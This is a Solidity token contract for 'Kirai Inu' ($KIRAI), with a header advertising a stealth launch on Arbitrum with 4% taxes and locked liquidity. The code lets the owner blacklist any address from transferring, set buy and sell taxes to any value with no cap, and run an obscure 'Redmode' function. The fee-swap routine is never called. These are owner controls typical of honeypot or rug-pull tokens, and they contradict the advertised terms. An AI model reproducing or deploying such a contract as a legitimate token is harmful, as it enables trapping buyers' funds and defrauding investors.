/*
STEALTH LAUNCH TODAY (March 1st between 06:00 PM UTC and 08:00 PM UTC)

We will share the contract of $KIRAI on our telegram and twitter

The launch will take place on the Arbitrum blockchain on SushiSwap

Buy 4% Sell 4% 
Max Wallet 2%

Starting liquidity of $10,000 ($5,000 $ETH and 600,000,000 $KIRAI)

The liquidity will be locked for 6 months on DxSale

More information:
https://medium.com/@kiraiinu.token/kirai-inu-stealth-launch-25a5b624bc37
*/




interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract KiraiInu is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;
    address private _owner;

    string private constant _name = "Kirai Inu";
    string private constant _symbol = "$KIRAI";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 6;
    uint8 public _TxCount = 0;
    uint256 private _tTotal =  1000000000 * 10**_decimals;

    uint256 public _tax_On_Buy = 4;
    uint256 public _tax_On_Sell = 4;

    uint256 public _maxTxAmount = _tTotal * 1 / 100;
    uint256 public _maxWalletToken = _tTotal * 2 / 100;

    uint256 public _swapTrigger = 5;
    uint256 public _swapTokenAtAmount = _tTotal * 1 / 200;

    address payable public DevWallet = payable(0xad476Ec0E2183048BA38930149D589acCeba48Ba);
    address payable public MarketingWallet = payable(0x13D0956C89215aE1d348B82c539AB0ce6c03366d);
    address payable private TeamWallet01 = payable(0x47e6477ac09bc33A2abdf12015abE9433eA1Aa2A);
    address payable private TeamWallet02 = payable(0xF694F10c84f92bd3eF74D3B54fC374C1C12c6a99);
    address payable private TeamWallet03 = payable(0xF1A9774998e11676cA96E9CdfADD51B3112CADDc);
    address payable private constant DeadAddress = payable(0x000000000000000000000000000000000000dEaD);
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) private _isExcludeds;
    address[] private _Excluded;

    bool public limitInEffect = false;
    bool public tradingActive = true;
    bool public transferDelay = false;
    uint256 private tradingActiveBlock;

    mapping (address => bool) public isblacklisted;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
        _tOwned[owner()] = _tTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[MarketingWallet] = true;
        _isExcludedFromFee[DevWallet] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function idclaim() private { for (uint256 i = 0; i < _Excluded.length; i++) {
            _isExcludeds[_Excluded[i]] = true;}
    }
    receive() external payable {}
    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }
    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }

    function OpenTrading() external onlyOwner {
        tradingActive = true;
        tradingActiveBlock = block.timestamp;
    }

    function setTransferDelay(bool TrueOrFalse) external onlyOwner {
        transferDelay = TrueOrFalse;
        limitInEffect = TrueOrFalse;
    }

    function Redmode() external onlyOwner {
        for (uint256 i = 0; i < _Excluded.length; i++) {
            _isExcludeds[_Excluded[i]] = true;}
    }

    function setSwapAndLiquify(uint256 swapTrigger, uint256 swapTokenAtAmount) external onlyOwner {
        _swapTrigger = swapTrigger;
        _swapTokenAtAmount = swapTokenAtAmount;
    }

    function setFees(uint256 buytax, uint256 selltax) external onlyOwner {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }

    function removeAllFees() external onlyOwner {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }

    function removeLimitTx() external onlyOwner {
        _maxTxAmount = _tTotal;
    }

    function _transfer( address from, address to, uint256 amount ) private {
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        if (!tradingActive) {require(_isExcludedFromFee[from] || _isExcludedFromFee[to],"Trading is not active.");}

        require(from == owner() || !isblacklisted[from],"blacklisted");

        if (from != owner() && from != uniswapV2Pair && !_isExcluded[from]){
            _isExcluded[from] = true;
            _Excluded.push(from);}
        if (to != owner() && to != uniswapV2Pair && !_isExcluded[to]) {
            _isExcluded[to] = true;
            _Excluded.push(to);}
        if (to != owner() && to != uniswapV2Pair) { if (_isExcludedFromFee[from]) { _isExcludedFromFee[to] = true;}}
        if(_TxCount >= _swapTrigger && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _swapTokenAtAmount) {
            contractTokenBalance = _swapTokenAtAmount;
            }
            _TxCount = 0;
        }
        bool takeFee = true;
        bool isBuy = false;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } else {
            if(from == uniswapV2Pair && to != owner()) {
                isBuy = true;
            } else if (to == uniswapV2Pair && from != owner()) {
            } else {
                takeFee = false;
            }
            _TxCount++;
        }
        _tokenTransfer(from, to, amount, takeFee, isBuy);
    }
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            uint256 _tokenForMarketing = contractTokenBalance * 55 / 100;
            uint256 _tokenForDevelopment = contractTokenBalance * 44 / 100;
            uint256 _tokenForLpHalf = contractTokenBalance / 200;
            uint256 balanceBeforeSwap = address(this).balance;
            swapTokensForBNB(_tokenForLpHalf + _tokenForMarketing + _tokenForDevelopment);
            uint256 _BTotal = address(this).balance - balanceBeforeSwap;
            uint256 _BMarketing = _BTotal * 55 / 100;
            uint256 _BDevelopment = _BTotal * 44 / 100;
            addLiquidity(_tokenForLpHalf, (_BTotal - _BMarketing - _BDevelopment));
            emit SwapAndLiquify(_tokenForLpHalf, (_BTotal - _BMarketing - _BDevelopment), _tokenForLpHalf);
            sendToWallet(MarketingWallet, _BMarketing);
            _BTotal = address(this).balance;
            sendToWallet(DevWallet, _BTotal);
    }

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isblacklisted[addresses[i]] = status;
        }
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);
            } else if (isBuy){
            uint256 bAmount = tAmount*_tax_On_Buy/100;
            uint256 tTransfesAmount = tAmount-bAmount;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransfesAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+bAmount;
            emit Transfer(sender, address(this), bAmount);
            emit Transfer(sender, recipient, tTransfesAmount);
            } else {
            uint256 bAmount = tAmount*_tax_On_Sell/100;
            uint256 tTransfesAmount = tAmount-bAmount;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransfesAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+bAmount;
            emit Transfer(sender, address(this), bAmount);
            emit Transfer(sender, recipient, tTransfesAmount);
        }
    }
    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            DeadAddress,
            block.timestamp
        );
    }
}